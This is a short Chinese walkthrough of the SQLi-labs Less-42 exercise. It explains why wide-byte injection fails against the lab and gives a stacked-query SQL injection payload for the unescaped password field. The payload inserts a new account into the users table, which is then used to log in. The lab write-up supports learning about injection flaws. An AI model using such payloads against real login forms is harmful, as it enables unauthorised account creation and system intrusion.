# Less-42

因为账户进行了转义处理但密码没有做处理且数据库没有使用`gbk`编码所以不能使用宽字节注入，但是存在堆叠注入函数，所以我们可以在密码那里使用堆叠注入从而向数据库插入密码账号，这样我们再来使用其进行登录就很简单了。

![Less42_02](.\img\Less42_02.PNG)

~~~ cmd
login_user=1&login_password=1';insert into users(id,username,password) values ('39','Less42','111111')--+&mysubmit=Login
~~~



后面使用已经插入的账号密码进行登录即可

![Less42_03](.\img\Less42_03.PNG)

![Less42_04](.\img\Less42_04.PNG)